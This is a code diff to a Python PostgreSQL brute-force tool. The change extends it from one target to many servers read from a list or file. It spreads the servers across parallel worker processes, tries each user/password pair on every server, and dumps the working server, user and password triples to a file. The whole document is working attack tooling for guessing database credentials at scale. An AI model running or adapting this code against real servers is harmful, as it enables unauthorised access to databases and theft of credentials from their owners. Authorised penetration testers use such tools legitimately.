@@ -41,32 +41,35 @@ def login(postgresql_server, port, user, password):
         t2 = time()
         return err, t2-t1
 
-def brute_force(thread_index, postgresql_server, port, credentials):
+
+def brute_force(thread_index, servers, port, credentials):
     successful_logins = {}
     for credential in credentials:
-        status = login(postgresql_server, port, credential[0], credential[1])
-        if status[0] == True:
-            successful_logins[credential[0]] = credential[1]
-            with lock:
-                display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
-        elif status[0] == False:
-            with lock:
-                display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
-        else:
-            with lock:
-                display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+        status = ['']
+        for server in servers:
+            status = login(server, port, credential[0], credential[1])
+            if status[0] == True:
+                successful_logins[server] = [credential[0], credential[1]]
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
+            elif status[0] == False:
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+            else:
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
-def main(server, port, credentials):
+def main(servers, port, credentials):
     successful_logins = {}
     thread_count = cpu_count()
     pool = Pool(thread_count)
     display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
     display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
     threads = []
-    credentials_count = len(credentials)
-    credential_groups = [credentials[group*credentials_count//thread_count: (group+1)*credentials_count//thread_count] for group in range(thread_count)]
-    for index, credential_group in enumerate(credential_groups):
-        threads.append(pool.apply_async(brute_force, (index, server, port, credential_group)))
+    total_servers = len(servers)
+    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
+    for index, server_division in enumerate(server_divisions):
+        threads.append(pool.apply_async(brute_force, (index, server_division, port, credentials)))
     for thread in threads:
         successful_logins.update(thread.get())
     pool.close()
@@ -75,7 +78,7 @@ def main(server, port, credentials):
     return successful_logins
 
 if __name__ == "__main__":
-    arguments = get_arguments(('-s', "--server", "server", "Target PostgreSQL Server"),
+    arguments = get_arguments(('-s', "--server", "server", "Target PostgreSQL Server (seperated by ',')"),
                               ('-p', "--port", "port", f"Port of Target PostgreSQL Server (Default={port})"),
                               ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
@@ -84,6 +87,15 @@ if __name__ == "__main__":
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
         exit(0)
+    else:
+        try:
+            with open(arguments.server, 'r') as file:
+                arguments.server = [server for server in file.read().split('\n') if server != '']
+        except FileNotFoundError:
+            arguments.server = arguments.server.split(',')
+        except Exception as error:
+            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
+            exit(0)
     if not arguments.port:
         arguments.port = port
     else:
@@ -133,11 +145,10 @@ if __name__ == "__main__":
     successful_logins = main(arguments.server, arguments.port, arguments.credentials)
     t2 = time()
     display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
-    display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
     display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
     display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
     with open(arguments.write, 'w') as file:
-        file.write(f"User,Password\n")
-        file.write('\n'.join([f"{user},{password}" for user, password in successful_logins.items()]))
+        file.write(f"Server,User,Password\n")
+        file.write('\n'.join([f"{server},{user},{password}" for server, (user, password) in successful_logins.items()]))
     display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
